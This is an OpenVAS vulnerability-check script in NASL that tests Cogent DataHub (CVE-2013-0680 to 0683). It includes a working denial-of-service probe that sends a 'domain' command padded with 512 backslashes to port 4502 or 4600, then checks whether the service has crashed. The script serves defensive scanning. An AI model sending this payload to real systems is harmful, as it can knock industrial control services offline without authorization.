###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cogent_datahub_multiple_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Cogent DataHub Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute
  arbitrary code or cause denial of service condition resulting in
  loss of availability.
  Impact Level: System/Application";

tag_affected = "Cogent DataHub before 7.3.0, OPC DataHub before 6.4.22,
  Cascade DataHub before 6.4.22 on Windows, and
  DataHub QuickTrend before 7.3.0";
tag_insight = "Multiple flaws due to
  - Improper handling of formatted text commands
  - Improper validation of HTTP request with a long header parameter
  - Error within string handling";
tag_solution = "Upgrade to Cogent DataHub 7.3.0, OPC DataHub 6.4.22,
  Cascade DataHub 6.4.22, DataHub QuickTrend 7.3.0 or later,
  For updates refer to http://www.cogentdatahub.com";
tag_summary = "The host is running Cogent DataHub and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(803491);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-0680", "CVE-2013-0681", "CVE-2013-0682", "CVE-2013-0683");
  script_bugtraq_id(58902, 58910, 58905, 58909);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-16 11:21:21 +0530 (Tue, 16 Apr 2013)");
  script_name("Cogent DataHub Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/92058");
  script_xref(name : "URL" , value : "http://www.osvdb.com/92055");
  script_xref(name : "URL" , value : "http://www.osvdb.com/92056");
  script_xref(name : "URL" , value : "http://www.osvdb.com/92059");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52945");
  script_xref(name : "URL" , value : "http://www.cogentdatahub.com/ReleaseNotes.html");
  script_summary("Check if Cogent DataHub is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports(4502, 4600);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Variable Initialization
attack = "";
dataPort = 4502;
soc = "";
req = "";
res = "";

## Get Default Port state
if(!get_port_state(dataPort))
{
  dataPort = 4600;
  if(!get_port_state(dataPort)){
    exit(0);
  }
}

## Open the socket
soc = open_sock_tcp(dataPort);
if(!soc){
  exit(0);
}

## Send normal request
req = string('(domain "openvas-test")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);

# Confirm Application
if('success "domain" "openvas-test"' >!< res){
  exit(0);
}

## Construct Attack Request
attack =  crap(data: "\\", length:512);
req = string('domain ', attack,'\r\n');

## Sending Attack Request
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(1);

## Open the socket
soc = open_sock_tcp(dataPort);
if(!soc)
{
  security_hole(dataPort);
  exit(0);
}

## Confirm the exploit by sending the normal request
req = string('(domain "openvas-test")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);

# Checking the Responce
if('success "domain" "openvas-test"' >!< res){
  security_hole(dataPort);
}
close(soc);
